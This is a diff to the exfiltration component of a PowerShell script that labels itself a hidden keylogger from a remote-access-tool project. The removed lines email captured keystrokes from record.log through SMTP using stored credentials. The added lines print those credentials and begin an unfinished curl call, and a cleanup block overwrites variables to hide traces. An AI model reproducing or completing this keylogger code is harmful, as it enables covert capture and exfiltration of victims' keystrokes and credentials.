@@ -4,7 +4,7 @@
 # the hidden keylogger it will run ~perfectly~
 # Coded by @J-P-S-O (https://github.com/J-P-S-O/jsrat)
 #
-#$file_data = Get-Content pass.txt
+$file_data = Get-Content pass.txt
 $EmailFrom = $file_data[2]
 $EmailTo = $file_data[2]
 $Subject = Get-Date
@@ -12,10 +12,14 @@ $Body = Get-Content record.log
 $SMTPServer = $file_data[3]
 $mailusername = $file_data[0]
 $mailpassword = $file_data[1]
-$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, $file_data[4])
-$SMTPClient.EnableSsl = $true
-$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($mailusername, $mailpassword);
-$SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)
+
+Write-Output $EmailFrom
+Write-Output $EmailTo
+Write-Output $mailusername
+Write-Output $mailpassword
+Write-Output $file_data[4]
+
+curl 
 
 # Remove all the data
 
@@ -26,5 +30,3 @@ $EmailFrom = "whoosh"
 $EmailTo = "whoosh"
 $Body = "whoosh"
 $Subject = "whoosh"
-$SMTPServer = "whoosh"
-$SMTPClient = "whoosh"
